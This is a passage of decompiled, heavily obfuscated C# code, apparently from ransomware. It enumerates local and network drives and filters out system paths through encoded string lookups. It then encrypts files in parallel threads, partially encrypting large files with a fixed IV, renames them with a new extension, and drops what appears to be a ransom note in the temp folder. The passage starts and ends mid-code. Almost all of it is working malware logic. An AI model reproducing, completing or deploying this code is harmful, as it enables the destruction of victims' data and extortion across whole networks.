	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107408418);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107404421);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107404412))) ? getString_0(107404426) : getString_0(107404435));
				break;
			case 0:
				text = getString_0(107404417);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107404896);
				break;
			case 4:
				text = getString_0(107404915);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107404865) : getString_0(107404906));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107404878) : getString_0(107395502)) : getString_0(107404883)) : getString_0(107404860));
				break;
			case 10:
				text = getString_0(107404873);
				break;
			}
		}
		if (text != getString_0(107408418))
		{
			text = getString_0(107404868) + text;
			if (oSVersion.ServicePack != getString_0(107408418))
			{
				text = text + getString_0(107406879) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string OIyqrMvBlER(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107411088);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(UwCpksGCJZfb(getString_0(107411559)));
				streamWriter.WriteLine(getString_0(107396509));
				streamWriter.WriteLine(UwCpksGCJZfb(getString_0(107409145)));
				streamWriter.WriteLine(string_0);
				if (rCIcEDqTdpw)
				{
					streamWriter.WriteLine(getString_0(107396509));
					streamWriter.WriteLine(UwCpksGCJZfb(getString_0(107409067)));
					streamWriter.WriteLine(SYJrybFSgaPzO.AaOvZSRLQs());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !aeWIyHaDtadg)
				{
					File.AppendAllText(text, getString_0(107409034) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(KymHhFbNcwDYA, getString_0(107404823) + ex.Message + getString_0(107396509));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void pciWuEzAvjS(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		GnNyOYNOWRBC.bBCilqCEhC CS_0024_003C_003E8__locals0 = new GnNyOYNOWRBC();
		CS_0024_003C_003E8__locals0.OUZTXgxEDSb = string_1;
		CS_0024_003C_003E8__locals0.KhkyNlfbSu = string_2;
		CS_0024_003C_003E8__locals0.KhxNTnMDrBki = string_3;
		CS_0024_003C_003E8__locals0.ggMjtyxusvhkCT = string_4;
		VROLwKjAIsul = Convert.FromBase64String(CS_0024_003C_003E8__locals0.KhxNTnMDrBki);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395733))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = nioDFVnHCKMKDq(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !OtDxRoGRan.Contains(text))
							{
								OtDxRoGRan.Add(text);
							}
							else if (!OtDxRoGRan.Contains(array[i].Name))
							{
								OtDxRoGRan.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!OtDxRoGRan.Contains(array[i].Name))
							{
								OtDxRoGRan.Add(array[i].Name);
							}
						}
					}
					else if (!OtDxRoGRan.Contains(array[i].Name))
					{
						OtDxRoGRan.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!OtDxRoGRan.Contains(string_0[j]))
				{
					OtDxRoGRan.Add(string_0[j]);
				}
			}
		}
		if (OtDxRoGRan.Contains(UwCpksGCJZfb(getString_0(107404766))) && GifiWLQUQbX == getString_0(107396742))
		{
			OtDxRoGRan.Remove(UwCpksGCJZfb(getString_0(107404766)));
		}
		Parallel.ForEach(OtDxRoGRan, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new GnNyOYNOWRBC.bBCilqCEhC();
			CS_0024_003C_003E8__locals0.WBCzILjQvF = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.SBAWZSnSKvG = string_0;
			if (JOJyxHQlEtnt && !GzujaRTNkzjcu().Contains(GnNyOYNOWRBC.getString_0(107404877)) && !GzujaRTNkzjcu().Contains(GnNyOYNOWRBC.getString_0(107356544)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						MknoxGcvnLujD(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.SBAWZSnSKvG);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ABcQQsWptXmkku == GnNyOYNOWRBC.getString_0(107396754))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					RwVpPfwXURoGZx(CS_0024_003C_003E8__locals0.SBAWZSnSKvG, CS_0024_003C_003E8__locals0.WBCzILjQvF.OUZTXgxEDSb, CS_0024_003C_003E8__locals0.WBCzILjQvF.ggMjtyxusvhkCT, CS_0024_003C_003E8__locals0.WBCzILjQvF.KhkyNlfbSu, CS_0024_003C_003E8__locals0.WBCzILjQvF.KhxNTnMDrBki);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				RwVpPfwXURoGZx(CS_0024_003C_003E8__locals0.SBAWZSnSKvG, CS_0024_003C_003E8__locals0.OUZTXgxEDSb, CS_0024_003C_003E8__locals0.ggMjtyxusvhkCT, CS_0024_003C_003E8__locals0.KhkyNlfbSu, CS_0024_003C_003E8__locals0.KhxNTnMDrBki);
			}
		});
	}

	public static void RwVpPfwXURoGZx(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107408418));
		List<string> list3 = list2;
		if (ZkldbQEYeeof == getString_0(107396999))
		{
			if (WvSpclaNoCFc == getString_0(107396742) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ROkMwyKYEzSqR(string_0))
			{
				DznYVPQyWVFwO dznYVPQyWVFwO = null;
				try
				{
					dznYVPQyWVFwO = new DznYVPQyWVFwO(string_0.Replace(getString_0(107397112), getString_0(107408418)));
				}
				catch
				{
					list = rffAcjefKKM(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					IKahjOdTppjZS(dznYVPQyWVFwO.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = rffAcjefKKM(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = rffAcjefKKM(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = tasvwISjgVBdlgK.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((SWXQQJgeWBPli == getString_0(107396999) && !item.EndsWith(text)) || usKuKFlfRGo.Contains(item))
				{
					continue;
				}
				if (ernpBfXEaTaC == getString_0(107396742))
				{
					try
					{
						if (sirjdslywbXhg.lbHjGrOeSMm(item))
						{
							sirjdslywbXhg.lbgprBqnBBcnLiR(item);
						}
					}
					catch
					{
					}
				}
				usKuKFlfRGo.Add(item);
				if (!aJxBDYqKswV.Contains(Path.GetDirectoryName(item)))
				{
					aJxBDYqKswV.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (zLetmNvKrIwT == getString_0(107396742) && fileStream.Length > Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024 && !list3.Contains(text))
					{
						if (wASqMXkPHKG == getString_0(107396742))
						{
							foreach (string item2 in dYfpziNqSOobL)
							{
								if (item.ToLower().EndsWith(item2) && SNKStIUyCToW == getString_0(107396742))
								{
									if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && SNKStIUyCToW == getString_0(107396999))
								{
									try
									{
										SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = NaRnXemgrEhEu.CfIULFaxXTze(item, Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024);
						byte[] nlACJGRWEHCA = NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						NaRnXemgrEhEu.dyvfLRQwyjnq(item, nlACJGRWEHCA);
						if (string_2 != getString_0(107404757))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107404757))
					{
						CUOXqCgsApZEFY(item, item + string_2, VROLwKjAIsul);
					}
					else
					{
						CUOXqCgsApZEFY(item, item + getString_0(107404784), VROLwKjAIsul);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void IKahjOdTppjZS(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		xTicVszXpILTir.sQMPyEprCtcgxr CS_0024_003C_003E8__locals0 = new xTicVszXpILTir();
		CS_0024_003C_003E8__locals0.dicUQzGeuGgAYU = list_0;
		CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD = string_1;
		CS_0024_003C_003E8__locals0.AwSXDGKxLfSIbIc = string_2;
		CS_0024_003C_003E8__locals0.ptBQsjxXVIiCd = string_3;
		CS_0024_003C_003E8__locals0.YEkhRYiyyfwXXR = new List<string> { getString_0(107408418) };
		if (SWXQQJgeWBPli == getString_0(107396999))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.dicUQzGeuGgAYU)
				{
					if (!item.Contains(xTicVszXpILTir.getString_0(107407982)) && !item.Contains(xTicVszXpILTir.getString_0(107407957)) && !item.Contains(xTicVszXpILTir.getString_0(107407924)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407939)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407894)) && !item.Contains(xTicVszXpILTir.getString_0(107407901)) && !item.Contains(xTicVszXpILTir.getString_0(107407848)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407867)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407822)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407785)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407808)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407759)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407221)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407232)) && !item.Contains(xTicVszXpILTir.getString_0(107407207)) && !item.Contains(xTicVszXpILTir.getString_0(107407158)) && !item.Contains(xTicVszXpILTir.getString_0(107407173)) && !item.Contains(xTicVszXpILTir.getString_0(107407124)) && !item.Contains(xTicVszXpILTir.getString_0(107407139)) && !item.Contains(xTicVszXpILTir.getString_0(107407090)) && !item.Contains(xTicVszXpILTir.getString_0(107407105)) && !item.Contains(xTicVszXpILTir.getString_0(107407056)) && !item.Contains(xTicVszXpILTir.getString_0(107407075)) && !item.Contains(xTicVszXpILTir.getString_0(107407022)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407041)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107406996)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407011)) && !item.ToLower().Contains(xTicVszXpILTir.getString_0(107407474)) && !item.Contains(UwCpksGCJZfb(xTicVszXpILTir.getString_0(107407489))) && !item.Contains(xTicVszXpILTir.getString_0(107407432)) && !item.Contains(xTicVszXpILTir.getString_0(107397159)) && !item.Contains(xTicVszXpILTir.getString_0(107407451)) && !item.EndsWith(CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD) && !item.EndsWith(xTicVszXpILTir.getString_0(107407418)) && !item.EndsWith(xTicVszXpILTir.getString_0(107407381)) && !item.EndsWith(xTicVszXpILTir.getString_0(107407376)) && !item.EndsWith(xTicVszXpILTir.getString_0(107407371)) && !item.Contains(xTicVszXpILTir.getString_0(107407398)) && !item.Contains(kcoCbafUQcNu) && !item.Contains(KymHhFbNcwDYA) && !item.Contains(DNnNiXPlebeA))
					{
						if (CS_0024_003C_003E8__locals0.AwSXDGKxLfSIbIc.Length != 0)
						{
							string[] awSXDGKxLfSIbIc2 = CS_0024_003C_003E8__locals0.AwSXDGKxLfSIbIc;
							int num2 = 0;
							while (num2 < awSXDGKxLfSIbIc2.Length)
							{
								string value2 = awSXDGKxLfSIbIc2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e93;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD))
							{
								goto IL_0e93;
							}
						}
						catch (Exception)
						{
							goto IL_0e93;
						}
						if (item.EndsWith(string_0) && !usKuKFlfRGo.Contains(item))
						{
							if (ernpBfXEaTaC == xTicVszXpILTir.getString_0(107396762))
							{
								try
								{
									if (sirjdslywbXhg.lbHjGrOeSMm(item))
									{
										sirjdslywbXhg.lbgprBqnBBcnLiR(item);
									}
								}
								catch
								{
								}
							}
							usKuKFlfRGo.Add(item);
							if (!aJxBDYqKswV.Contains(Path.GetDirectoryName(item)))
							{
								aJxBDYqKswV.Add(Path.GetDirectoryName(item));
							}
							JQZzLwKsZGVNU(item);
							try
							{
								new aCpGquenmSFv().advpQeGLuA(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (IebLDrmorstxvf)
										{
											Console.WriteLine(xTicVszXpILTir.getString_0(107356571) + item + xTicVszXpILTir.getString_0(107355982) + new FileInfo(item).Length + xTicVszXpILTir.getString_0(107355993));
											Console.WriteLine(xTicVszXpILTir.getString_0(107355952));
										}
									}
									catch
									{
									}
									eZjDlpokwsIwI(UwCpksGCJZfb(xTicVszXpILTir.getString_0(107355879)), xTicVszXpILTir.getString_0(107407282) + item + xTicVszXpILTir.getString_0(107407282) + UwCpksGCJZfb(xTicVszXpILTir.getString_0(107355822)) + xTicVszXpILTir.getString_0(107407282) + Environment.UserName + xTicVszXpILTir.getString_0(107407282) + UwCpksGCJZfb(xTicVszXpILTir.getString_0(107355837)));
								}
							}
							catch (Exception ex18)
							{
								if (LbhjvcCDDsZLYlccs)
								{
									try
									{
										File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + item + xTicVszXpILTir.getString_0(107355812) + ex18.Message + xTicVszXpILTir.getString_0(107396529));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0716;
									}
									goto end_IL_0716_2;
									end_IL_0716:;
								}
								catch (Exception ex20)
								{
									if (LbhjvcCDDsZLYlccs)
									{
										try
										{
											File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + item + xTicVszXpILTir.getString_0(107356211) + ex20.Message + xTicVszXpILTir.getString_0(107396529));
										}
										catch (Exception)
										{
										}
									}
									WfLfyuLvRnJc++;
									goto end_IL_0716_2;
								}
								if (!(zLetmNvKrIwT == xTicVszXpILTir.getString_0(107396762)) || new FileInfo(item).Length <= Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024 || CS_0024_003C_003E8__locals0.YEkhRYiyyfwXXR.Contains(string_0))
								{
									if (rCIcEDqTdpw)
									{
										CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD = gpxoAkpemIpRD + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD;
									}
									string text5 = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
									string text6 = xTicVszXpILTir.getString_0(107408438);
									text6 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : xTicVszXpILTir.getString_0(107408438));
									string s3 = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
									{
										if (!YEiCwolccbrDJ)
										{
											if (!aeWIyHaDtadg)
											{
												FUeBmieOxgVOz(item, item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, VROLwKjAIsul);
											}
											else
											{
												FUeBmieOxgVOz(item, item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!aeWIyHaDtadg)
												{
													UhqvkICiuPON(item, item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
												}
												else
												{
													UhqvkICiuPON(item, item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (LbhjvcCDDsZLYlccs)
												{
													try
													{
														File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + item + xTicVszXpILTir.getString_0(107404795) + ex22.Message + xTicVszXpILTir.getString_0(107396529));
													}
													catch (Exception)
													{
													}
												}
												WfLfyuLvRnJc++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0716_2;
											}
										}
									}
									else if (!YEiCwolccbrDJ)
									{
										if (!aeWIyHaDtadg)
										{
											FUeBmieOxgVOz(item, item + xTicVszXpILTir.getString_0(107404804), VROLwKjAIsul);
										}
										else
										{
											FUeBmieOxgVOz(item, item + xTicVszXpILTir.getString_0(107404804), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!aeWIyHaDtadg)
											{
												UhqvkICiuPON(item, item, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
											}
											else
											{
												UhqvkICiuPON(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (LbhjvcCDDsZLYlccs)
											{
												try
												{
													File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + item + xTicVszXpILTir.getString_0(107404795) + ex25.Message + xTicVszXpILTir.getString_0(107396529));
												}
												catch (Exception)
												{
												}
											}
											WfLfyuLvRnJc++;
											goto end_IL_0716_2;
										}
									}
									if (aeWIyHaDtadg)
									{
										if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
										{
											fowJyXOiDyhEY(item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, bytes3);
										}
										else
										{
											fowJyXOiDyhEY(item, bytes3);
										}
									}
									goto IL_0e93;
								}
								CS_0024_003C_003E8__locals0 = new xTicVszXpILTir.sIsSRnqrXLf();
								CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
									{
										if (rCIcEDqTdpw)
										{
											CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD = gpxoAkpemIpRD + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD);
									}
								}
								catch (Exception ex27)
								{
									if (LbhjvcCDDsZLYlccs)
									{
										try
										{
											File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + item + xTicVszXpILTir.getString_0(107356150) + ex27.Message + xTicVszXpILTir.getString_0(107396529));
										}
										catch (Exception)
										{
										}
									}
									WfLfyuLvRnJc++;
									goto end_IL_0716_2;
								}
								CS_0024_003C_003E8__locals0.NdQCkpOoElZY = xTicVszXpILTir.getString_0(107408438);
								if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
								{
									CS_0024_003C_003E8__locals0.NdQCkpOoElZY = item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD;
								}
								else
								{
									CS_0024_003C_003E8__locals0.NdQCkpOoElZY = item;
								}
								if (wASqMXkPHKG == xTicVszXpILTir.getString_0(107396762))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in dYfpziNqSOobL)
										{
											if (CS_0024_003C_003E8__locals0.NdQCkpOoElZY.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc.pcXEMNCHXKbhD) && SNKStIUyCToW == xTicVszXpILTir.sIsSRnqrXLf.getString_0(107396765))
											{
												if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.NdQCkpOoElZY).Length)
												{
													try
													{
														SYJrybFSgaPzO.JEuvJEKelGD(xTicVszXpILTir.sIsSRnqrXLf.getString_0(107408042), xTicVszXpILTir.sIsSRnqrXLf.getString_0(107408037), xTicVszXpILTir.sIsSRnqrXLf.getString_0(107408504), CS_0024_003C_003E8__locals0.NdQCkpOoElZY);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.NdQCkpOoElZY.ToLower().EndsWith(item2) && SNKStIUyCToW == xTicVszXpILTir.sIsSRnqrXLf.getString_0(107397022))
											{
												try
												{
													SYJrybFSgaPzO.JEuvJEKelGD(xTicVszXpILTir.sIsSRnqrXLf.getString_0(107408042), xTicVszXpILTir.sIsSRnqrXLf.getString_0(107408037), xTicVszXpILTir.sIsSRnqrXLf.getString_0(107408504), CS_0024_003C_003E8__locals0.NdQCkpOoElZY);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text7 = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
								string text8 = xTicVszXpILTir.getString_0(107408438);
								text8 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : xTicVszXpILTir.getString_0(107408438));
								string s4 = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (tmrMvaVtFfCS == xTicVszXpILTir.getString_0(107397019))
								{
									byte[] array2 = null;
									byte[] byte_2 = NaRnXemgrEhEu.CfIULFaxXTze(CS_0024_003C_003E8__locals0.NdQCkpOoElZY, Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024);
									if (NaRnXemgrEhEu.dyvfLRQwyjnq(NlACJGRWEHCA: (!vGfsNnNMtKaym) ? (aeWIyHaDtadg ? NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptBQsjxXVIiCd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (aeWIyHaDtadg ? GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptBQsjxXVIiCd), Convert.FromBase64String(heWrupMPBNsV))), CeNYFaLSDRX: CS_0024_003C_003E8__locals0.NdQCkpOoElZY, YSvPvJtuif: bytes4))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!aeWIyHaDtadg)
								{
									if (GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.NdQCkpOoElZY, vwHJGZSsQHuV, CS_0024_003C_003E8__locals0.ptBQsjxXVIiCd, null, Convert.FromBase64String(heWrupMPBNsV)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.NdQCkpOoElZY, vwHJGZSsQHuV, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_0e93;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0716_2:;
							}
							catch (Exception)
							{
								goto IL_0e93;
							}
						}
					}
					continue;
					IL_0e93:
					CS_0024_003C_003E8__locals0.dicUQzGeuGgAYU.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.dicUQzGeuGgAYU, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new xTicVszXpILTir.sQMPyEprCtcgxr();
			CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR = string_0;
			if (!CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407982)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407957)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407924)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407939)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407894)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407901)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407848)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407867)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407822)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407785)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407808)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407759)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407221)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407232)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407207)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407158)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407173)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407124)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407139)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407090)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407105)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407056)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407075)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407022)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407041)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107406996)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407011)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().Contains(xTicVszXpILTir.getString_0(107407474)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(UwCpksGCJZfb(xTicVszXpILTir.getString_0(107407489))) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407432)) 